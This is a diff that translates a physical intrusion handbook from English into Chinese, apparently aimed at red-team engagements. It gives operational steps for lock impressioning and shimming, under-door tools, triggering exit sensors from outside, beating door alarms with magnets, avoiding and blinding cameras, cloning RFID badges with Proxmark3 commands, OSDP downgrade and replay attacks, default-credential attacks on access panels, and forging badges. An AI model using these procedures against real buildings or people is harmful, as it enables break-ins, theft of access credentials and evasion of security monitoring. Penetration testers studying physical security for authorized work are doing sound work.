+方法：
+  第 1 步：把坯料抛光到镜面（痕迹会呈现为亮银色）
+  第 2 步：把坯料插入锁中
+  第 3 步：施加轻旋转张力，同时让坯料前后、左右移动
+           （即“晃动动作”：在每个弹子位置造成卡滞痕迹）
+  第 4 步：取出坯料，在放大镜下观察
+           明亮的银色痕迹 = 驱动销在张力下接触坯料的位置
+  第 5 步：把这些亮痕锉成浅 V 形（每个位置锉一刀）
+  第 6 步：重新抛光、重新插入、重复
+  每一轮：钥匙在每个齿位上都更接近正确深度
+
+  10-30 轮之后：钥匙能转动锁。
+
+练习：买一把廉价挂锁和匹配的钥匙坯；练到稳定为止。
+          r/lockpicking 的腰带评级把压印列为高级技能。
+          在实验室里做不到 30 分钟以内稳定成功之前，不要实战尝试。
 ```
 
 ---
 
-### 1.4 ELECTRONIC ACCESS CONTROL BYPASS
+### 1.3 绕过工具：比开锁更快
+
+```
+并非所有锁都需要开。大多数可以更快地绕过。
+按以下顺序学习：用能起作用的最简单的方法。
+
+垫片（挂锁）：
+  薄铝垫片插入锁梁与锁体之间
+  可破开多数 40 美元以下挂锁上的弹簧锁梁机构
+  自己用易拉罐剪：2cm x 4cm 长条，折成 J 形
+  把垫片插入锁梁槽，向下推，拉锁梁：打开
+
+  适用于：Master No.1、No.3，多数五金店挂锁
+  不适用于：双锁挂锁（Mul-T-Lock、ABUS Granit）
+  速度：熟练后 10-20 秒
+
+插卡开锁（弹簧锁舌）：
+  信用卡、酒店房卡或聚酯薄膜条
+  把卡片插入门与门框之间、锁舌位置
+  一边按压门一边把卡片推向锁舌：锁舌回缩
+  适用于：没有防盗锁的内部办公室门、酒店卫生间门、
+             储藏室、多数内部弹簧锁舌门
+  不适用于：防盗锁、带防插卡板的边锁、锁扣盒
+  速度：5-15 秒
+
+门下工具（UDT）：
+  用于带执手、朝你方向开的门（内开执手门）
+  工具：门下工具 + 长距离钩（covertinstruments.com，约 40 美元）
+  把 UDT 从门下伸入：钩子套住另一侧的执手
+  在你这一侧向下拉工具：执手被压下：门打开
+
+  适用于：多数内部执手门
+  不适用于：外开门、球形把手、带报警的执手
+  速度：10-30 秒
+  为何重要：IT 机房、机房、库房的内部办公室门
+                  通常用执手，且没有防盗锁
+
+气楔（为工具撑开缝隙）：
+  可充气楔形袋插入门的上角，充气后在门与门框之间
+  撑出一道小缝
+  用途：把长距离工具穿过缝隙去操作内部五金件
+  配合：UDT，或用铁丝钩按压内部推杆 / 逃生推杆
+  来源：专业气楔套装（亚马逊约 35 美元）；也叫“车门楔”
+  实战笔记：用在上角：更不显眼，对门框压力也更小
+
+凸轮锁（老挂锁、大门、储物间）：
+  钥匙孔内的简单凸轮挡住错误钥匙
+  破解：凸轮万能钥匙套装（10 美元）：几乎无材料的钥匙，能通过所有凸轮
+
+重力 / 垫片组合：
+  有些挂锁在插入垫片的同时把锁梁向下压就会打开
+  两种都试：垫片尝试时锁梁向上和向下
+```
+
+---
+
+### 1.4 电子门禁绕过
 
 <div align="center">
 <table><tr><td>
@@ -431,489 +431,489 @@ GRAVITY / SHIM COMBINATION:
 </td></tr></table>
 </div>
 
-#### PATH 1: REQUEST-TO-EXIT (REX) SENSOR MANIPULATION
+#### 路径 1：请求出门（REX）传感器操纵
 
 ```
-What it is:
-  Every access-controlled door has a REX sensor on the INSIDE to let people exit freely.
-  REX sensors detect motion or use a push button: when triggered, they signal the
-  controller to momentarily unlock the door.
+是什么：
+  每一扇受门禁控制的门在内侧都有一个 REX 传感器，让人可以自由出去。
+  REX 传感器检测动作或使用按钮：触发后，它们会通知
+  控制器，短暂解锁门。
 
-  Types of REX sensors:
-    Passive Infrared (PIR): motion-triggered, mounted above door interior
-    Request button: push-to-exit button on interior wall
-    Crash bar: physical push bar connected to REX circuit
-    Dual technology: PIR + microwave for higher security
+  REX 传感器的类型：
+    被动红外（PIR）：动作触发，安装在门内侧上方
+    请求按钮：内墙上的按压出门按钮
+    逃生推杆：与 REX 回路相连的物理推杆
+    双技术：PIR + 微波，安全性更高
 
-Bypass technique: PIR REX manipulation from exterior:
-  If there is a gap under the door (even 1cm): slide a thin stiff rod or
-  Slim Jim tool under the door: wave it in front of the PIR sensor
-  The PIR detects motion: triggers REX: door unlocks momentarily
+绕过技巧：从外部操纵 PIR REX：
+  如果门下有空隙（哪怕 1cm）：把一根细硬杆或
+  Slim Jim 工具从门下伸入：在 PIR 传感器前晃动
+  PIR 检测到动作：触发 REX：门短暂解锁
 
-  Tools: piece of coat hanger wire, a "lasso tool" (wire with a loop end)
-  Timing: some systems have a short window (2-5 seconds): have your hand on the handle
+  工具：一段衣架铁丝、一个“套索工具”（末端带环的铁丝）
+  时机：有些系统的窗口很短（2-5 秒）：手要提前放在把手上
 
-  Works on: many interior-to-exterior access control doors with standard PIR REX
-  Does NOT work on: doors with no gap, dual-tech REX (needs both motion + microwave),
-                     doors with REX sensors mounted too high to reach
+  适用于：许多内到外的门禁门，配备标准 PIR REX
+  不适用于：没有缝隙的门、双技术 REX（需要动作 + 微波同时满足）、
+                     REX 传感器装得太高够不到的门
 ```
 
-#### PATH 2: DOOR CONTACT DEFEAT
+#### 路径 2：门磁破坏
 
 ```
-What it is:
-  Many alarmed doors use a magnetic door contact: a magnet on the door and
-  a reed switch on the frame. When the door opens, the circuit breaks: alarm triggers.
+是什么：
+  许多带报警的门使用磁性门磁：门上一个磁铁，
+  门框上一个干簧管。门一开，回路断开：触发报警。
 
-Bypass:
-  Apply a strong external magnet (neodymium, 20-50mm, ~$8 from Amazon) to the
-  reed switch on the frame BEFORE opening the door.
-  The reed switch stays closed (magnet holds it) even as the door opens.
-  No circuit break: no alarm signal.
+绕过：
+  在开门之前，把一块强外磁铁（钕磁，20-50mm，亚马逊约 8 美元）
+  贴在门框上的干簧管上。
+  即使门打开，干簧管也保持闭合（磁铁吸住它）。
+  回路不断开：没有报警信号。
 
-  Must know: which side the reed switch is on (usually frame, at door edge)
-  Visual identification: small rectangular sensor, same color as frame, at top corner
+  必须知道：干簧管在哪一侧（通常在门框、门边处）
+  目视识别：小长方形传感器，颜色与门框相同，位于上角
 ```
 
-#### PATH 3: ELECTRIC STRIKE vs MAGLOCK IDENTIFICATION
+#### 路径 3：电锁扣 vs 磁力锁的识别
 
 ```
-Fail-safe (power OFF = unlocked): used on fire exit doors
-  Power cut = door opens.
-  Attack: kill power to the door (breaker room, cut CAT5 to controller)
+失效安全（断电 = 解锁）：用于消防逃生门
+  断电 = 门打开。
+  攻击：切断门的供电（配电间，切断到控制器的 CAT5 线）
 
-Fail-secure (power OFF = locked): standard security doors
-  Power cut = door stays locked.
-  Attack: credential-based (RFID clone) or physical bypass (REX, shim, UDT)
+失效锁定（断电 = 上锁）：标准安全门
+  断电 = 门保持上锁。
+  攻击：基于凭证（RFID 克隆）或物理绕过（REX、垫片、UDT）
 
-Identify which type at a glance:
-  Maglock (large metal plate on frame + metal plate on door): usually fail-safe
-  Electric strike (recessed in the strike box): most are fail-secure
-```
-
----
-
-### 1.5 CAMERA BYPASS AND VISUAL SURVEILLANCE DEFEAT
-
-```
-UNDERSTAND THE SYSTEM BEFORE DEFEATING IT
-
-Camera types in corporate environments:
-  Fixed IP cameras: cover a defined zone, no movement
-  PTZ (Pan-Tilt-Zoom): operator-controlled or auto-tracking, wider coverage
-  Fisheye (360 degrees): ceiling mount, covers entire room with distortion
-  ANPR (Automatic Number Plate Recognition): at perimeter, reads plates
-
-Coverage gap analysis (what every camera has):
-  Dead zones: the area directly beneath a ceiling-mount camera
-               is usually NOT covered (camera points outward and downward)
-  Mounting angle: most cameras cover a 90-110 degree horizontal field of view
-                  Standing at the extreme left or right edge of the frame = partial cover
-  Blind corners: hallway intersections, doorway frames, equipment blocking line of sight
-```
-
-#### Pre-Engagement Camera Recon
-
-```
-  1. Google Street View + satellite view: spot exterior cameras (positions, angles)
-  2. During pretext visit (delivery, job interview, vendor meeting):
-     walk the target area noting camera positions, types, mounting height
-  3. Drone aerial photo: overhead view identifies camera placement on rooflines
-  4. LinkedIn job postings for "physical security" or "security guard" often list
-     the camera manufacturer (Milestone, Genetec, Hanwha, Axis): helps identify capabilities
-```
-
-#### Camera Defeat Techniques
-
-```
-Technique 1: Dead Zone Navigation (cost: $0):
-  Most effective. Walk directly beneath ceiling-mount cameras.
-  Move along walls (cameras point into the room, not straight down along the wall).
-  Avoid open-floor paths that point directly at camera faces.
-
-Technique 2: Physical Obstruction:
-  Post-It note, sticker, or smear on the lens during access.
-  Works on: fixed cameras in unmonitored locations (storage areas, server rooms)
-
-Technique 3: Temporary IR Blinding:
-  Concept: cameras use IR LEDs for night vision. Flooding IR into the lens
-  saturates the sensor: image becomes white, unreadable.
-  Tool: IR LED flashlight (850nm, $15-30 on Amazon) pointed directly at the lens
-  Effective range: 3-8 meters for most IR flashlights vs. standard IP cameras
-  Limitation: daylight color cameras are not using IR: this does not blind them
-              in daylight. Use at night or in low-light server rooms.
-
-Technique 4: Locating Camera Lenses in Dark Spaces:
-  In low-light areas (server rooms, comms closets): use a smartphone front-facing
-  camera (which typically lacks an IR filter): point IR flashlight at suspected
-  camera locations while viewing through front camera.
-  Camera lenses reflect IR distinctly as a bright white dot.
-
-Technique 5: Deliberate Cover Story (most field-realistic):
-  Do not defeat the camera. Look like you belong.
-  Camera footage is only evidence if someone reviews it.
-  If your pretext holds, the footage shows an authorized person doing their job.
-  The performance is the bypass.
-
-WHAT NOT TO DO:
-  Spray-painting cameras, cutting cables, physically removing cameras: triggers
-  immediate investigation and escalates to police. Only done in fiction.
-  Laser pointers: illegal to aim at cameras in most jurisdictions + triggers incident.
+一眼识别类型：
+  磁力锁（门框上一大块金属板 + 门上一块金属板）：通常失效安全
+  电锁扣（嵌在锁扣盒内）：多数为失效锁定
 ```
 
 ---
 
-### 1.6 RFID / HID CLONING (LEGACY + MODERN READERS)
-
-#### How RFID Access Cards Work
+### 1.5 摄像头绕过与视觉监控反制
 
 ```
-RFID BASICS:
-  The card contains a microchip and an antenna (the coil you see when held to light).
-  The reader emits an RF field: the card antenna harvests energy from the field:
-  powers the chip: chip transmits its unique ID number: reader grants/denies access.
+先理解系统，再破解它
 
-FREQUENCIES (determines attack tools):
-  125kHz (LF): HID Prox, EM4100, EM4200, Indala
-    These are LEGACY and common in older buildings (pre-2010 installs).
-    Unencrypted: the card broadcasts its ID to any reader, including yours.
-    ATTACK: trivially clonable with Flipper Zero or Proxmark3.
+企业环境中的摄像头类型：
+  固定 IP 摄像头：覆盖既定区域，不移动
+  PTZ（云台-变焦）：由操作员控制或自动跟踪，覆盖范围更大
+  鱼眼（360 度）：吊顶安装，以畸变覆盖整个房间
+  ANPR（自动车牌识别）：部署在周界，读取车牌
 
-  13.56MHz (HF): MIFARE Classic, MIFARE DESFire, HID iCLASS, HID SEOS
-    Higher security: some are encrypted.
-    ATTACK: varies by card type (see table below).
+覆盖盲区分析（每个摄像头都有）：
+  死区：吊顶摄像头正下方的区域
+               通常不在覆盖范围内（摄像头朝外、朝下看）
+  安装角度：多数摄像头覆盖 90-110 度水平视野
+                  站在画面最左或最右边缘 = 部分被遮挡
+  盲角：走廊交叉口、门框、遮挡视线的设备
+```
 
-READER IDENTIFICATION:
-  Look at the reader itself. Most have the manufacturer and model visible.
+#### 行动前摄像头侦察
 
-  HID Global readers:
-    HID Prox (gray/white, Wiegand output, 125kHz): CLONABLE
-    HID iCLASS (black, 13.56MHz): PARTIALLY clonable (older cards with no key)
-    HID multiCLASS SE (supports BOTH 125kHz and 13.56MHz simultaneously):
-      The multiCLASS SE reads whichever card the user presents.
-      OLD CARDS from a building migrating away from 125kHz still work on it.
-      ATTACK: if any 125kHz HID Prox cards are still in circulation in the building,
-      your T5577 clone will work on the multiCLASS SE reader even if the building
-      "thinks" it has upgraded. This is the most common gap.
+```
+  1. Google 街景 + 卫星视图：找出外部摄像头（位置、角度）
+  2. 在托词走访期间（送快递、面试、供应商会谈）：
+     走遍目标区域，记录摄像头位置、类型、安装高度
+  3. 无人机航拍：俯视图能确定屋顶线上的摄像头布点
+  4. LinkedIn 上“物理安全”或“保安”岗位的招聘信息常常列出
+     摄像头厂商（Milestone、Genetec、Hanwha、Axis）：有助于判断能力
+```
 
-  Allegion/Schlage readers:
-    Schlage AD-Series: 13.56MHz, MIFARE DESFire EV1/EV2
+#### 摄像头反制技巧
+
+```
+技巧 1：死区穿行（成本：0 美元）：
+  最有效。直接从吊顶摄像头正下方走过。
+  沿墙移动（摄像头朝房间内看，不会沿墙垂直向下看）。
+  避免走正对摄像头镜头的开阔地面路线。
+
+技巧 2：物理遮挡：
+  进入时在镜头上贴便签、贴纸或涂抹。
+  适用于：无人监控地点的固定摄像头（储藏区、机房）
+
+技巧 3：临时红外致盲：
+  原理：摄像头用红外 LED 做夜视。向镜头灌入红外
+  会使传感器饱和：画面变成一片白，无法读取。
+  工具：红外 LED 手电（850nm，亚马逊 15-30 美元）直射镜头
+  有效距离：对标准 IP 摄像头，多数红外手电为 3-8 米
+  局限：日间彩色摄像头不使用红外：白天
+              无法致盲。请在夜间或弱光机房使用。
+
+技巧 4：在暗处定位摄像头镜头：
+  在弱光区域（机房、通信间）：用手机前置
+  摄像头（通常没有红外滤镜）：一边用前置摄像头观察，
+  一边把红外手电对准疑似摄像头位置。
+  摄像头镜头会把红外明显反射成一个亮白点。
+
+技巧 5：刻意的掩护故事（最贴近实战）：
+  不要去破坏摄像头。让你看起来像是这里的人。
+  只有有人调阅时，监控录像才是证据。
+  只要你的托词成立，录像里就只是一个授权人员在干自己的活。
+  表演本身就是绕过。
+
+不要做的事：
+  喷漆摄像头、割线、物理拆除摄像头：会立刻引发
+  调查并惊动警方。只在虚构作品里才这么做。
+  激光笔：在多数司法辖区瞄准摄像头是违法的，而且会触发事件。
+```
+
+---
+
+### 1.6 RFID / HID 克隆（旧式与现代读卡器）
+
+#### RFID 门禁卡如何工作
+
+```
+RFID 基础：
+  卡片内含一颗微芯片和一根天线（对着光看能看到线圈）。
+  读卡器发出射频场：卡片天线从场中获取能量：
+  为芯片供电：芯片发送其唯一 ID 号：读卡器据此放行或拒绝。
+
+频率（决定攻击工具）：
+  125kHz（低频）：HID Prox、EM4100、EM4200、Indala
+    这些是旧式技术，在老建筑中很常见（2010 年前安装）。
+    未加密：卡片会向任何读卡器广播自己的 ID，包括你的。
+    攻击：用 Flipper Zero 或 Proxmark3 即可轻易克隆。
+
+  13.56MHz（高频）：MIFARE Classic、MIFARE DESFire、HID iCLASS、HID SEOS
+    安全性更高：部分已加密。
+    攻击：因卡类型而异（见下表）。
+
+读卡器识别：
+  直接看读卡器本身。多数都能看到厂商和型号。
+
+  HID Global 读卡器：
+    HID Prox（灰/白色，Wiegand 输出，125kHz）：可克隆
+    HID iCLASS（黑色，13.56MHz）：部分可克隆（无密钥的旧卡）
+    HID multiCLASS SE（同时支持 125kHz 和 13.56MHz）：
+      multiCLASS SE 会读取用户出示的任何一张卡。
+      正在从 125kHz 迁移的建筑里的旧卡依然能用。
+      攻击：如果大楼里仍有任一 125kHz HID Prox 卡在流通，
+      你的 T5577 克隆卡就能在 multiCLASS SE 读卡器上使用，哪怕这栋楼
+      “以为”自己已经升级。这是最常见的缺口。
+
+  Allegion/Schlage 读卡器：
+    Schlage AD 系列：13.56MHz，MIFARE DESFire EV1/EV2
   
-  STid readers (European): OSDP-capable (see OSDP section below)
+  STid 读卡器（欧洲）：支持 OSDP（见下文 OSDP 一节）
 ```
 
-#### RFID Attack Matrix
+#### RFID 攻击矩阵
 
 ```
 +-------------------+----------+------------------+---------------------+---------------------+
-| Card Type         | Freq     | Protocol         | Attack Feasibility  | Tool                |
+| 卡片类型          | 频率     | 协议             | 攻击可行性          | 工具                |
 +-------------------+----------+------------------+---------------------+---------------------+
-| HID Prox          | 125kHz   | Wiegand          | TRIVIAL             | Flipper Zero        |
-| EM4100/EM4200     | 125kHz   | EM               | TRIVIAL             | Flipper Zero        |
-| Indala            | 125kHz   | Wiegand          | TRIVIAL             | Proxmark3           |
-| MIFARE Classic 1K | 13.56MHz | ISO14443A        | FEASIBLE (weak key) | Proxmark3 autopwn   |
-| MIFARE Classic 4K | 13.56MHz | ISO14443A        | FEASIBLE            | Proxmark3 autopwn   |
-| iCLASS (no key)   | 13.56MHz | iCLASS           | FEASIBLE            | Proxmark3 iclass    |
-| iCLASS SE         | 13.56MHz | iCLASS SE        | HARD (SIO-encrypted)| Research only       |
-| HID SEOS          | 13.56MHz | SEOS             | NOT FEASIBLE (2027) | No known tool       |
-| MIFARE DESFire EV2| 13.56MHz | ISO14443A        | NOT FEASIBLE        | No known tool       |
-| MIFARE Ultralight | 13.56MHz | ISO14443A        | FEASIBLE (no auth)  | Flipper Zero        |
+| HID Prox          | 125kHz   | Wiegand          | 极易                | Flipper Zero        |
+| EM4100/EM4200     | 125kHz   | EM               | 极易                | Flipper Zero        |
+| Indala            | 125kHz   | Wiegand          | 极易                | Proxmark3           |
+| MIFARE Classic 1K | 13.56MHz | ISO14443A        | 可行（弱密钥）      | Proxmark3 autopwn   |
+| MIFARE Classic 4K | 13.56MHz | ISO14443A        | 可行                | Proxmark3 autopwn   |
+| iCLASS（无密钥）  | 13.56MHz | iCLASS           | 可行                | Proxmark3 iclass    |
+| iCLASS SE         | 13.56MHz | iCLASS SE        | 困难（SIO 加密）    | 仅限研究            |
+| HID SEOS          | 13.56MHz | SEOS             | 不可行（2027）      | 无已知工具          |
+| MIFARE DESFire EV2| 13.56MHz | ISO14443A        | 不可行              | 无已知工具          |
+| MIFARE Ultralight | 13.56MHz | ISO14443A        | 可行（无认证）      | Flipper Zero        |
 +-------------------+----------+------------------+---------------------+---------------------+
 ```
 
-#### Flipper Zero: Practical Walkthrough (HID Prox)
+#### Flipper Zero 实操演练（HID Prox）
 
 ```
-EQUIPMENT:
-  Flipper Zero ($200): handles 125kHz and 13.56MHz cards + sub-GHz RF + IR
-  Proxmark3 RDV4 ($350): deeper analysis, better 13.56MHz attack capability
-  T5577 blanks ($1-2 each): write-once cards for cloning 125kHz credentials
-  Magic Gen2 cards: writable 13.56MHz MIFARE Classic blanks
+设备：
+  Flipper Zero（200 美元）：处理 125kHz 和 13.56MHz 卡 + sub-GHz 射频 + 红外
+  Proxmark3 RDV4（350 美元）：分析更深，13.56MHz 攻击能力更强
+  T5577 空白卡（每张 1-2 美元）：用于克隆 125kHz 凭证的一次写入卡
+  Magic Gen2 卡：可写的 13.56MHz MIFARE Classic 空白卡
 
-CAPTURE HID PROX CREDENTIAL:
-  Method 1: Direct read (you have the card):
-    Flipper Zero: 125kHz > Read
-    Hold card to Flipper Zero back for 2-3 seconds
-    Result shows: Facility Code (FC) + Card Number (CN)
-    Example: FC: 117 / CN: 15432
-    Save: tap Save, name it (e.g., "target_badge")
+采集 HID Prox 凭证：
+  方法 1：直接读取（卡在你手上）：
+    Flipper Zero：125kHz > Read
+    把卡贴在 Flipper Zero 背面 2-3 秒
+    结果显示：设施码（FC）+ 卡号（CN）
+    示例：FC: 117 / CN: 15432
+    保存：点 Save，命名（例如 "target_badge"）
 
-  Method 2: Long-range covert capture:
-    Flipper Zero with external antenna module ($25): read range extends to 8-10cm
-    Proxmark3 with external LF antenna: read range up to 30cm in field conditions
-    Approach: badge reader near shoulder height: brush past target holding device
-    against their hip or bag pocket where the badge lives
-    Note: HID Prox credentials are broadcast in the clear by the card at any time.
-    You do not need to be at a reader. You need to be within read range of the card.
+  方法 2：远距离隐蔽采集：
+    带外置天线模块（25 美元）的 Flipper Zero：读取距离扩到 8-10cm
+    配外置低频天线的 Proxmark3：实战条件下读取距离可达 30cm
+    接近方式：读卡器约在肩高：拿着设备从目标身边擦过，
+    贴近其髋部或包袋，卡就在那里
+    注：HID Prox 凭证由卡片随时明文广播。
+    你不需要在读卡器旁，只需要处在卡片的读取范围内。
 
-WRITE CLONE TO T5577:
-  On Flipper Zero: go to saved credential: Write: Write to T5577 blank
-  Wait for write confirmation: test on a reader of the same type
+把克隆写入 T5577：
+  在 Flipper Zero 上：进入已保存的凭证：Write：Write to T5577 blank
+  等待写入确认：在同一类型的读卡器上测试
 
-  Verify: the T5577 now broadcasts the same FC:CN as the original card.
-  The access control panel sees the correct credential and grants access.
+  验证：T5577 现在广播与原始卡相同的 FC:CN。
+  门禁面板看到的是正确的凭证，于是放行。
 
-PROXMARK3: DEEPER ANALYSIS:
+PROXMARK3：更深层分析：
 
-  Install community firmware (iceman fork - most feature-complete):
+  安装社区固件（iceman 分支——功能最完整）：
   git clone https://github.com/RfidResearchGroup/proxmark3
   cd proxmark3 && make clean && make all
 
-  Read 125kHz HID Prox:
+  读取 125kHz HID Prox：
   pm3 --> lf hid reader
 
-  Output: HID Prox 26-bit FC:117 CN:15432
+  输出：HID Prox 26-bit FC:117 CN:15432
 
-  Clone to T5577:
+  克隆到 T5577：
   pm3 --> lf hid clone --fc 117 --cn 15432
 
-  For MIFARE Classic (13.56MHz):
-  pm3 --> hf mf autopwn     (recovers all sector keys via nested attack)
-  pm3 --> hf mf dump        (dumps all 16 sectors to file)
-  pm3 --> hf mf restore     (writes dump to a Magic Gen2 blank card)
+  针对 MIFARE Classic（13.56MHz）：
+  pm3 --> hf mf autopwn     (通过嵌套攻击恢复所有扇区密钥)
+  pm3 --> hf mf dump        (将所有 16 个扇区转储到文件)
+  pm3 --> hf mf restore     (将转储写入 Magic Gen2 空白卡)
 ```
 
-#### OSDP: The 2027 Access Control Reality
+#### OSDP：2027 年的门禁现实
 
 ```
-WHAT OSDP IS:
-  Open Supervised Device Protocol (OSDP) is the modern replacement for Wiegand.
-  Developed by the Security Industry Association (SIA).
-  OSDP v2 (current standard) adds AES-128 encrypted channel between reader and panel.
+OSDP 是什么：
+  开放受监管设备协议（OSDP）是 Wiegand 的现代替代。
+  由安全行业协会（SIA）制定。
+  OSDP v2（现行标准）在读卡器与面板之间增加 AES-128 加密通道。
 
-WHY IT MATTERS FOR ATTACKERS:
+为什么这对攻击者重要：
 
-  Wiegand (legacy):
-    Reader sends card data to panel over two unencrypted wires (D0 and D1).
-    Anyone who taps these wires captures the credential in plaintext.
-    This is why Wiegand has been the attacker's favorite for 30 years.
+  Wiegand（旧式）：
+    读卡器通过两根未加密的线（D0 和 D1）把卡数据发给面板。
+    任何搭线的人都能以明文捕获凭证。
+    这就是 30 年来 Wiegand 一直是攻击者最爱的原因。
 
-  OSDP v2 with AES-128 Secure Channel:
-    Reader and panel negotiate an AES-128 encrypted session at startup.
-    Card data is encrypted in transit: tapping the cable gives you ciphertext.
-    The D0/D1 Wiegand tap that works on legacy systems does NOT work here.
+  带 AES-128 安全通道的 OSDP v2：
+    读卡器与面板在启动时协商 AES-128 加密会话。
+    卡数据在传输中加密：搭线只能拿到密文。
+    在旧系统上有效的 D0/D1 Wiegand 搭线在这里无效。
 
-HOW TO IDENTIFY OSDP vs WIEGAND IN THE FIELD:
+如何在现场区分 OSDP 与 WIEGAND：
 
-  Wiegand indicators:
-    Cable from reader has 2 data wires (green + white, or D0 + D1 labeled)
-    plus power and ground = 4 wire minimum
-    Reader uses a standard pigtail with color-coded bare wire ends
-    Reader markings often say: "Wiegand" or show "WG" in model number
+  Wiegand 特征：
+    读卡器线缆有 2 根数据线（绿 + 白，或标为 D0 + D1）
+    加上电源和地 = 至少 4 根线
+    读卡器用标准尾线，末端是带颜色的裸线
+    读卡器标记常写：“Wiegand” 或型号里带 “WG”
 
-  OSDP indicators:
-    Cable is typically RS-485 (2-wire differential: A and B lines)
-    Reader has an RJ45 or screw terminal connection instead of pigtail
-    Reader model includes "OSDP" in the name or spec sheet
-    STid, Bosch, HID VertX, Allegion AP Series: all OSDP-capable
+  OSDP 特征：
+    线缆通常是 RS-485（2 线差分：A 和 B 线）
+    读卡器用 RJ45 或接线端子，而不是尾线
+    读卡器型号名或规格书里含 “OSDP”
+    STid、Bosch、HID VertX、Allegion AP 系列：都支持 OSDP
 
-  Field recon tip:
-    Pull up the manufacturer + model number from the reader during a pretext visit.
-    Search it before the engagement: "READER_MODEL OSDP" in Google.
-    If OSDP: the credential capture via Wiegand tap is not viable.
+  现场侦察提示：
+    在托词走访时记下读卡器的厂商 + 型号。
+    行动前先搜：“READER_MODEL OSDP”。
+    若是 OSDP：通过 Wiegand 搭线捕获凭证就行不通了。
 
-OSDP ATTACK SURFACE (2027):
+OSDP 攻击面（2027）：
 
-  Attack 1: OSDP Downgrade (if not enforced):
-    Many buildings configure OSDP readers but forget to enforce Secure Channel.
-    If Secure Channel is not enforced (OSDP "plain text mode"), the bus is as
-    readable as Wiegand. Use a logic analyzer (Saleae Logic Pro 8, $479) on the
-    RS-485 cable and decode OSDP frames.
-    Tool: github.com/ezforever/osdp-tool (OSDP frame parser)
-    Check: if you see card IDs in plaintext in the decoded output, SC is not enforced.
+  攻击 1：OSDP 降级（若未强制启用）：
+    许多建筑为 OSDP 读卡器做了配置，却忘了强制启用安全通道。
+    如果未强制启用安全通道（OSDP“明文模式”），这条总线就和
+    Wiegand 一样可读。在 RS-485 线缆上使用逻辑分析仪
+    （Saleae Logic Pro 8，479 美元）解码 OSDP 帧。
+    工具：github.com/ezforever/osdp-tool（OSDP 帧解析器）
+    检查：若解码输出中能看到明文卡号，说明安全通道未强制启用。
 
-  Attack 2: OSDP Replay (if SC not enforced):
-    Capture a valid OSDP card-present message: replay it: access granted.
-    Same concept as Wiegand replay but at the OSDP protocol layer.
+  攻击 2：OSDP 重放（若未强制安全通道）：
+    捕获一条合法的 OSDP 卡片到场消息：重放它：放行。
+    与 Wiegand 重放同一概念，只是发生在 OSDP 协议层。
 
-  Attack 3: Physical path attacks still work:
-    OSDP secures the signal between reader and panel.
-    It does NOT secure the card credential itself.
-    If the card is a 125kHz HID Prox (common in legacy-hybrid buildings),
-    the RFID clone still works: you present a clone to the reader,
-    the reader generates a valid OSDP message: the panel grants access.
-    The OSDP channel protects the wire, not the card.
+  攻击 3：物理路径攻击依然有效：
+    OSDP 保护的是读卡器与面板之间的信号。
+    它并不保护卡片凭证本身。
+    如果卡是 125kHz HID Prox（旧式混合建筑中常见），
+    RFID 克隆依然有效：你向读卡器出示克隆卡，
+    读卡器生成合法的 OSDP 消息：面板放行。
+    OSDP 通道保护的是线缆，不是卡片。
 
-  Attack 4: Panel-side attack:
-    Access control panels (HID VertX EVO, Lenel OnGuard, Genetec) are network-connected.
-    These are embedded Linux or Windows CE devices with management web interfaces.
-    Default credentials are common. Network scan + credential stuffing is viable.
-    If you have network access (via LAN Turtle), scanning for panel management interfaces
-    (port 4050, 8443, 3001 depending on manufacturer) and accessing the panel directly
-    is often faster than attacking the credential layer.
+  攻击 4：面板侧攻击：
+    门禁面板（HID VertX EVO、Lenel OnGuard、Genetec）都接入网络。
+    这些是带管理网页界面的嵌入式 Linux 或 Windows CE 设备。
+    默认凭证很常见。网络扫描 + 凭证填充是可行的。
+    如果你有网络访问（通过 LAN Turtle），扫描面板管理界面
+    （端口 4050、8443、3001，视厂商而定）并直接访问面板，
+    通常比攻击凭证层更快。
 
-OSDP BEGINNER LAB PATH:
-  Week 1: Read the SIA OSDP v2 specification (siaonline.org, free registration)
-  Week 2: Install osdp-tool; capture OSDP traffic from a lab reader if available
-  Week 3: Identify OSDP vs Wiegand in 5 different reader photos (image search + spec sheet research)
-  Week 4: Scan a lab network for access control panel management interfaces
-  Goal: understand the protocol before you encounter it in the field
-```
-
----
-
-### 1.7 BADGE VISUAL CLONING
-
-```
-WHY VISUAL CLONING MATTERS:
-  A cloned RFID credential gets you past the electronic reader.
-  A badge that LOOKS wrong gets you challenged by a human guard or employee.
-  Both layers must be addressed.
-
-INTELLIGENCE GATHERING:
-  Source 1: Company website team photos and blog posts
-    Employees often wear badges in photo ops. High-resolution photos reveal:
-    badge dimensions, color scheme, logo placement, lanyard style,
-    whether a photo ID is present, clip vs lanyard attachment.
-
-  Source 2: LinkedIn and social media
-    Conference photos, office culture posts, remote work background images.
-    Employees visible with badges clipped to shirts or lanyards.
-
-  Source 3: Google Street View
-    If the building has a lobby visible through glass: reception badges may be visible.
-
-  Source 4: Pretext visit as a member of the public
-    Observe badges in person on employees entering or exiting.
-    Note: size (most are CR80: standard credit card size), orientation (horizontal/vertical),
-    color, any holographic overlay, the clip type.
-
-BADGE FABRICATION:
-  Design software: Canva or Adobe Illustrator
-  Print: CR80 PVC card on an ID card printer (Magicard, Zebra: $300-800 new, $80+ used)
-  Or: Inkjet print on matte photo paper laminated in CR80 laminate pouches ($0.50 each)
-  For the RFID layer: insert the cloned T5577 card. The visual badge conceals it.
-
-  Combine: visual clone + RFID clone in one card = full credential package.
-
-VISITOR BADGE RESEARCH:
-  Many organizations use a pre-printed visitor badge design.
-  These often appear on company social media in photos of events and tours.
-  Recreate the visitor badge design before a physical engagement:
-  you may be issued one at reception; or you may present your own if unchallenged.
-
-BODY CAMERA AND BADGE WEAR:
-  Clip height: chest level (employees) vs. hip level (contractors)
-  Lanyard color: often department-specific or role-specific
-  Clip direction: photo facing forward (company standard) vs. tucked (covering photo)
-  Observe when possible before replicating.
+OSDP 初学者实验路径：
+  第 1 周：阅读 SIA OSDP v2 规范（siaonline.org，免费注册）
+  第 2 周：安装 osdp-tool；若有实验读卡器，抓取 OSDP 流量
+  第 3 周：从 5 张不同的读卡器照片中识别 OSDP 还是 Wiegand（图片搜索 + 规格书研究）
+  第 4 周：扫描实验网络中的门禁面板管理界面
+  目标：在实地遇到之前先理解协议
 ```
 
 ---
 
-### 1.8 HARDWARE IMPLANTS: LAN TURTLE + EDR-EVASIVE CALLBACKS
-
-#### LAN Turtle: Deployment and Configuration
+### 1.7 证件视觉克隆
 
 ```
-WHAT IT IS:
-  Hak5 LAN Turtle: a disguised USB Ethernet adapter containing a full Linux system.
-  When plugged into a switch port or between a device and switch:
